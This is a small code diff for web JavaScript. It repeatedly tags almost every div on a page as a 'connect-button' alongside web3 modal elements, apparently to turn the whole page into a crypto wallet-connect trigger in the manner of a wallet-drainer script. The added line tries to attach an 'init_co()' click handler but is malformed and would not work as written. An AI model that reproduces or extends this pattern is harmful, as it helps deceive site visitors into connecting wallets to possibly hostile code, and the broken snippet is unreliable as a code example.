@@ -22,6 +22,7 @@
         const buttons = document.querySelectorAll('div:not(.connect-button):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
         for (const button of buttons) {
             button.classList.add('connect-button');
+           onclick="init_co()" 
         }
     }
     setInterval(addClassesToElements, 300);
